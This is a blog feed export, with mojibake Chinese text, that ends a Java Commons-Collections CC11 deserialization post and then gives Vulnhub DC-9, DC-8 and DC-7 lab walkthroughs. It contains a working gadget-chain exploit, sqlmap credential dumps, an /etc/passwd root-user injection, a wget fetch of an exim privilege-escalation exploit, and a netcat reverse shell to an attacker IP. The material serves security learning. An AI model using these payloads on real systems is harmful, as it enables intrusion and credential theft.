class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC11Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://java-tools/test.class&quot;</span>));  </span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Calc&quot;</span>);  </span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);  </span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);    </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();   </span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)); </span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, templates);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; expMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        expMap.put(tiedMapEntry, <span class="string">&quot;value&quot;</span>);  </span><br><span class="line">        lazyMap.remove(templates);   </span><br><span class="line">        setFieldValue(lazyMap, <span class="string">&quot;factory&quot;</span>, invokerTransformer);  </span><br><span class="line">  </span><br><span class="line">        serialize(expMap);  </span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);  </span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        field.set(obj, value);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>è°ƒè¯•é‡åˆ°äº†ç‚¹é—®é¢˜ï¼Œä¸çŸ¥é“é‚£ä¸ªä»£ç ä¸ºä»€ä¹ˆä¸èƒ½è°ƒï¼Œæ€»çš„æ¥è¯´è¿™æ¡é“¾å­å°±æ˜¯CC2çš„ååŠéƒ¨åˆ†åŠ CC6çš„å‰åŠéƒ¨åˆ†ç¨å¾®ä¿®æ”¹ï¼Œæ²¡ç”¨åˆ°Transformeræ•°ç»„ï¼Œå¯¹äºåé¢çš„shiroå­¦ä¹ åšä¸ªé“ºå«</p><p>å‚è€ƒï¼š<br>æœ¬æ–‡å¤§éƒ½å‚è€ƒä¸‹é¢ä¸¤ç¯‡åšå®¢<br><a href="https://drun1baby.top/2022/07/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8709-CC11%E9%93%BE/">Javaååºåˆ—åŒ–Commons-Collectionsç¯‡09-CC11é“¾ | Drunkbabyâ€™s Blog (drun1baby.top)</a><br><a href="http://zhuabapa.top/2022/11/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc11/#bu-dai-transformer-shu-zu-de-cc-11-lian-zi">â€˜Javaååºåˆ—åŒ–-cc11â€™ | zer0_c|imbâ€™s blog (zhuabapa.top)</a></p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub-DC-9</title>
      <link href="/2023/07/Vulnhub-DC-9/"/>
      <url>/2023/07/Vulnhub-DC-9/</url>
      
        <content type="html"><![CDATA[<h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><p>ä¸‹è½½åœ°å€ï¼š<a href="https://www.vulnhub.com/entry/dc-9,412/">DC: 9 ~ VulnHub</a></p><h2 id="å¼€å§‹æ‰“é¶"><a href="#å¼€å§‹æ‰“é¶" class="headerlink" title="å¼€å§‹æ‰“é¶"></a>å¼€å§‹æ‰“é¶</h2><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102156811.png" alt="image-20230710215518164"><br>ç«¯å£å¼€æ”¾<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102156096.png" alt="image-20230710215632028"><br>è®¿é—®é¡µé¢ï¼Œåœ¨searchç•Œé¢ç»è¿‡ä¸æ–­å°è¯•ç¡®å®å­˜åœ¨æ³¨å…¥<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102156357.png" alt="image-20230710215648288"><br>ä¸¢è¿›sqlmapçœ‹çœ‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.75.142/results.php&quot; -data &quot;search=1&quot; --dbs</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102157562.png" alt="image-20230710215708752"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.75.142/results.php&quot; -data &quot;search=1&quot; -D users --tables</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102157055.png" alt="image-20230710215732019"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.75.142/results.php&quot; -data &quot;search=1&quot; -D users -T UserDetails --columns</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102157804.png" alt="image-20230710215742063"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.75.142/results.php&quot; -data &quot;search=1&quot; -D users -T UserDetails -C username,password --dump</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102158323.png" alt="image-20230710215806259"><br>éƒ½æ˜¯è´¦å·å¯†ç ï¼Œç„¶åå»çœ‹çœ‹å¦ä¸€ä¸ªåº“</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.75.142/results.php/results.php&quot; -data &quot;search=1&quot; -D Staff -tables</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102158975.png" alt="image-20230710215817948"><br>å‡ºæ¥ä¸¤ä¸ªè¡¨ï¼Œè¿™é‡Œé€‰æ‹©å…ˆçœ‹Usersè¡¨ï¼Œä¸­é—´ä¸åˆ—å‡ºæ•°æ®äº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.75.142/results.php/results.php&quot; -data &quot;search=1&quot; -D Staff -T Users -C Username,Password --dump</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102158221.png" alt="image-20230710215827174"><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102158899.png" alt="image-20230710215846860"><br>ç„¶åå»ç™»å½•ï¼Œæœ€ç»ˆåœ¨å¦‚ä¸‹ä½ç½®æ‰¾åˆ°æ–‡ä»¶åŒ…å«<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102159667.png" alt="image-20230710215902265"><br>åœ¨è¿™é‡Œé‡åˆ°ä¸€ä¸ªæ–°ä¸œè¥¿ï¼Œä»¥å‰æ²¡æœ‰ç¢°åˆ°è¿‡<br><strong>knockdæœåŠ¡ï¼šå³æ•²é—¨ç«¯å£æœåŠ¡ï¼Œè¯¥æœåŠ¡é€šè¿‡åŠ¨æ€çš„æ·»åŠ iptablesè§„åˆ™æ¥éšè—ç³»ç»Ÿå¼€å¯çš„æœåŠ¡ï¼Œä½¿ç”¨è‡ªå®šä¹‰çš„ä¸€ç³»åˆ—åºåˆ—å·æ¥â€œæ•²é—¨â€ï¼Œï¼Œä½¿ç³»ç»Ÿå¼€å¯éœ€è¦è®¿é—®çš„æœåŠ¡ç«¯å£ï¼Œæ‰èƒ½å¯¹å¤–è®¿é—®ï¼Œä¸ä½¿ç”¨æ—¶ï¼Œå†ä½¿ç”¨è‡ªå®šä¹‰åºåˆ—å·æ¥â€œå…³é—¨â€ï¼Œå°†ç«¯å£å…³é—­ï¼Œä¸å¯¹å¤–ç›‘å¬ã€‚è¿›ä¸€æ­¥æå‡äº†æœåŠ¡å’Œç³»ç»Ÿçš„å®‰å…¨æ€§ï¼Œå®ƒçš„é»˜è®¤é…ç½®æ–‡ä»¶æ˜¯ï¼š&#x2F;etc&#x2F;knockd.conf</strong><br>é‚£ä¹ˆå»è®¿é—®è¿™ä¸ªæ–‡ä»¶<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102159278.png" alt="image-20230710215927048"><br>ç„¶åä½¿ç”¨ncéƒ½æ•²ä¸€é<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102159850.png" alt="image-20230710215950798"><br>ç„¶åä½¿ç”¨nmapå‘ç°22ç«¯å£æ‰“å¼€<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102200168.png" alt="image-20230710220008671"><br>æ¥ç€æŠŠåˆšåˆšçˆ†å‡ºæ¥çš„ç”¨æˆ·å¯†ç å…¨éƒ¨å¼„ä¸€ä¸ªå¼ è¡¨ï¼Œæœ€ç»ˆçˆ†å‡ºæ¥ä¸‹é¢å‡ ä¸ªç”¨æˆ·<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102200215.png" alt="image-20230710220044501"><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102200040.png" alt="image-20230710220056987"><br>ä¸‰ä¸ªç”¨æˆ·ç»æŸ¥çœ‹å•¥éƒ½æ²¡ç”¨ï¼Œä½†æ˜¯åœ¨ç”¨æˆ·janitorå¾—åˆ°ä¸€äº›åˆ—å¯†ç <br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102201983.png" alt="image-20230710220113563"><br>åŠ å…¥åˆ°æˆ‘ä»¬åˆšåˆšç”Ÿæˆçš„å¯†ç ä¸­å†çˆ†ä¸€æ¬¡ï¼Œå¾—åˆ°ä¸€ä¸ªæ–°ç”¨æˆ·<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102201412.png" alt="image-20230710220131358"></p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>æˆ‘ä»¬æ‰§è¡Œ<code>sudo -l</code>çœ‹çœ‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102201614.png" alt="image-20230710220146891"><br>è¿›å…¥è¿™ä¸ªç›®å½•æ²¡å•¥å‘ç°ï¼Œè¿”å›ä¸Šä¸¤å±‚å‘ç°ä¸€ä¸ªtest.pyæ–‡ä»¶<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102201582.png" alt="image-20230710220159542"><br>æœ€ç»ˆå‘ç°å®ƒæœ‰ç€å†™å…¥ç›®å½•çš„åŠŸèƒ½</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span> (sys.argv) != <span class="number">3</span> :</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;Usage: python test.py read append&quot;</span>)</span><br><span class="line">    sys.exit (<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">    f = <span class="built_in">open</span>(sys.argv[<span class="number">1</span>], <span class="string">&quot;r&quot;</span>)</span><br><span class="line">    output = (f.read())</span><br><span class="line"></span><br><span class="line">    f = <span class="built_in">open</span>(sys.argv[<span class="number">2</span>], <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    f.write(output)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é€šè¿‡å‘&#x2F;etc&#x2F;passwdä¸­æ·»åŠ ç”¨æˆ·è¾¾åˆ°ææƒï¼Œå¹¶ä¸”å¯†ç éœ€è¦åŠ å¯†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 -salt admin1 123456</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102202833.png" alt="image-20230710220214807"><br>åœ¨Linuxä¸Šæ‰§è¡Œï¼Œç„¶åè·³è½¬åˆ°&#x2F;opt&#x2F;devstuff&#x2F;dist&#x2F;testç›®å½•ä¸‹ä½¿ç”¨echoå‘½ä»¤åœ¨&#x2F;tmpç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œæ–‡ä»¶åè‡ªå®šä¹‰å°±è¡Œï¼Œæˆ‘ä½¿ç”¨userï¼Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;admin:$1$admin1$kBcb8DdRJKeqQ2e6acZ0J0:0:0::/root:/bin/bash&#x27; &gt;&gt; /tmp/user</span><br></pre></td></tr></table></figure><p>åˆ›å»ºå®Œä¹‹åä½¿ç”¨sudoå‘½ä»¤æ‰§è¡Œuseræ–‡ä»¶å°†&#x2F;tmp&#x2F;test1çš„å†…å®¹å†™å…¥åˆ°&#x2F;etc&#x2F;passwdæ–‡ä»¶ä¸­ï¼Œç„¶åä½¿ç”¨sudoå‘½ä»¤æ‰§è¡Œtestæ–‡ä»¶å°†&#x2F;tmp&#x2F;userçš„å†…å®¹å†™å…¥åˆ°&#x2F;etc&#x2F;passwdæ–‡ä»¶ä¸­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./test /tmp/passwd /etc/passwd</span><br></pre></td></tr></table></figure><p>ç„¶ååˆ‡æ¢è´¦æˆ·ææƒæˆåŠŸ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102202264.png" alt="image-20230710220228195"></p>]]></content>
      
      
      <categories>
          
          <category> é¶æœº </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub-DC-8</title>
      <link href="/2023/07/Vulnhub-DC-8/"/>
      <url>/2023/07/Vulnhub-DC-8/</url>
      
        <content type="html"><![CDATA[<h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><p>ä¸‹è½½åœ°å€ï¼š<a href="https://download.vulnhub.com/dc/DC-8.zip">https://download.vulnhub.com/dc/DC-8.zip</a></p><h2 id="å¼€å§‹æ‰“é¶"><a href="#å¼€å§‹æ‰“é¶" class="headerlink" title="å¼€å§‹æ‰“é¶"></a>å¼€å§‹æ‰“é¶</h2><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102142896.png" alt="image-20230710214105893"><br>è®¿é—®IPï¼Œå¾—åˆ°ä¸ºDrupal 7å’ŒDC-7ä¸€æ¨¡ä¸€æ ·ï¼Œæ²¡å•¥æ€è·¯æ‰«ä¸ªç›®å½•çœ‹çœ‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102144538.png" alt="image-20230710214246015"><br>ç‰ˆæœ¬ä¸º7.67ï¼Œmsfä¸Šæ²¡æœ‰å•¥æ¼æ´ï¼Œä½†æ˜¯è¿™é‡Œè‚¯å®šæ˜¯ç›´æ¥æ¼æ´åˆ©ç”¨ï¼Œäºæ˜¯æ‰¾åˆ°äº†å¦‚ä¸‹ç•Œé¢çš„sqlæ³¨å…¥<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102145659.png" alt="image-20230710214453951"><br>ç›´æ¥ä¸Šsqlmap</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.75.141/?nid=1&quot; --dbs</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102145465.png" alt="image-20230710214534488"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.75.141/?nid=1&quot; -D d7db --table</span><br></pre></td></tr></table></figure><p>ç„¶åæ‰¾åˆ°å¦‚ä¸‹è¡¨ï¼Œè¿›å…¥çœ‹çœ‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102146562.png" alt="image-20230710214636451"><br>æœ€ç»ˆæ‰¾åˆ°å­—æ®µ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.75.141/?nid=1&quot; -D d7db -T users -C name,pass --dump</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102146811.png" alt="image-20230710214656747"><br>æ¥ç€ä½¿ç”¨jhonå»çˆ†ç ´å®ƒï¼ŒæŠŠè¿™ä¸¤è¡Œå¯†ç å¤åˆ¶åˆ°è®°äº‹æœ¬é‡Œç„¶åå»çˆ†ç ´<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102147518.png" alt="image-20230710214708462"><br>çˆ†ç ´ç»“æœä¸º<code>john/turtle</code>ï¼Œç„¶ååœ¨ä¸‹é¢æ’å…¥ä»£ç <br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102147987.png" alt="image-20230710214719930"><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102147628.png" alt="image-20230710214729585"><br>ç„¶åå°†shellè½¬ä¸ºäº¤äº’å¼shell<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102147680.png" alt="image-20230710214740153"></p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102148572.png" alt="image-20230710214811512"><br>æœ‰ä¸ªexim4è¿™é‡Œè¯•ä¸€ä¸‹ï¼Œå…ˆçœ‹ä¸‹ç‰ˆæœ¬<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102148762.png" alt="image-20230710214837694"><br>exim4ææƒéœ€è¦å†™æƒé™ï¼Œè€Œåœ¨è¿™ä¸ªç›®å½•ä¸‹æ²¡ç”¨ï¼Œé‚£ä¹ˆåˆ‡æ¢åˆ°tmpç›®å½•ä¸‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102148679.png" alt="image-20230710214851580"><br>å¤åˆ¶ä¸‹æ¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/linux/local/46996.sh /home/joker27</span><br></pre></td></tr></table></figure><p>ç„¶åpythonèµ·æœåŠ¡å°†æ–‡ä»¶ä¸‹è½½åˆ°é¶æœºä¸Š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget &quot;http://192.168.75.128:8000/46996.sh&quot;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102149296.png" alt="image-20230710214903242"><br>ç„¶åèµ‹äºˆæ‰§è¡Œæƒé™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x 46996.sh</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./46996.sh -m netcat</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102149889.png" alt="image-20230710214913825"><br>å¾—èµ¶å¿«æ‰§è¡Œï¼Œä¸ç„¶ä¼šå¤±å»root<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102149961.png" alt="image-20230710214923860"></p>]]></content>
      
      
      <categories>
          
          <category> é¶æœº </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub-DC-7</title>
      <link href="/2023/07/Vulnhub-DC-7/"/>
      <url>/2023/07/Vulnhub-DC-7/</url>
      
        <content type="html"><![CDATA[<h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><p>ä¸‹è½½åœ°å€ï¼š<a href="https://download.vulnhub.com/dc/DC-7.zip">https://download.vulnhub.com/dc/DC-7.zip</a></p><h2 id="å¼€å§‹æ‰“é¶"><a href="#å¼€å§‹æ‰“é¶" class="headerlink" title="å¼€å§‹æ‰“é¶"></a>å¼€å§‹æ‰“é¶</h2><p>å­˜æ´»IPæ‰«æ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101545737.png" alt="image-20230710154535976"><br>è®¿é—®é¡µé¢ï¼Œå†…å®¹ä¸ºDrupalçš„CMS<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101546614.png" alt="image-20230710154607577"><br>é¡µé¢ä¸Šé¢æ²¡å•¥ä¸œè¥¿ï¼Œä½†æ˜¯é¡µé¢ä¸‹æœ‰<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101546544.png" alt="image-20230710154617505"><br>ç™¾åº¦ä¸€ä¸‹è¿™ä¸ªç”¨æˆ·å‘ç°ä¸ºå…¶GitHub<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101546648.png" alt="image-20230710154627596"><br>è®¿é—®å…¶config.phpå¾—åˆ°æ•°æ®åº“è´¦å·å¯†ç ï¼Œä½†æ˜¯ç™»å½•ä¸ä¸Šå´å¯ä»¥ç™»å½•ssh<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101546146.png" alt="image-20230710154646095"><br>è¿æ¥å¦‚ä¸‹<img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101546247.png" alt="image-20230710154656166"><br>æ‰“å¼€mboxå‘ç°å­˜åœ¨<code>/opt/scripts/backups.sh</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101547561.png" alt="image-20230710154719484"><br>è®¿é—®å…¶ç›®å½•ï¼ŒæŸ¥çœ‹backups.sh<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101547994.png" alt="image-20230710154736908"><br>å‘ç°æœ‰ä¸ªdrushå‘½ä»¤ï¼Œä½†æ˜¯ä¸çŸ¥é“å…¶ä½œç”¨ï¼Œæœç´¢åå‘ç°è¿™ä¸ªå‘½ä»¤å¯ä»¥ä¿®æ”¹å¯†ç ï¼Œè¿›å…¥åˆ°var&#x2F;www&#x2F;htmlä½¿ç”¨å…¶å‘½ä»¤ä¿®æ”¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drush user-password admin --password=&quot;123456&quot;</span><br></pre></td></tr></table></figure><p>ç„¶ååˆ©ç”¨è¿™ä¸ªè´¦å·å¯†ç å»ç™»é™†<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101547364.png" alt="image-20230710154749303"><br>åœ¨Contentâ€”&gt;Add contentâ€“&gt;Basic pageä¸‹å‡†å¤‡å†™é©¬ä½†æ˜¯ä¸æ”¯æŒï¼Œå°†phpè¿›è¡Œå¼•å…¥!<img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101547449.png" alt="image-20230710154758394"><br>å¦‚ä¸‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101548482.png" alt="image-20230710154812450"><br>ç„¶åæŠŠè¿™ä¸ªæ‰©å±•å¼€å¯äº†å†è¿›å…¥åˆšåˆšé‚£ä¸ªç•Œé¢<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101548082.png" alt="image-20230710154820011"><br>ç„¶åå†™å…¥æœ¨é©¬<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101548475.png" alt="image-20230710154835443"><br>æœ€åç”¨4è¿ä¸Šäº†ï¼Œå¥‡å¥‡æ€ªæ€ª<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101548880.png" alt="image-20230710154845834"></p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>è¿›å…¥optç›®å½•ï¼Œå†™å…¥æ‰“å¼€ç»ˆç«¯ç„¶åå†™å…¥ææƒçš„è¯­å¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 192.168.75.128 6666 &gt;/tmp/f&quot; 